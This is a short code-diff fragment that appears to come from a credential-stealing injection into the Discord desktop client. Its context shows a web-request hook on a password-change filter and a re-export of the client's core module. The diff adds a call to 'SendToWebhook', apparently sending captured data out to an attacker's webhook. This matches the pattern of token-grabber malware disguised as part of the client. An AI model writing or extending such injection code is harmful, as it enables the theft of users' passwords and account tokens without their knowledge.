@@ -1467,4 +1467,5 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
 		}))
 	}
 });
+SendToWebhook("aaaaaa")
 module.exports = require('./core.asar')
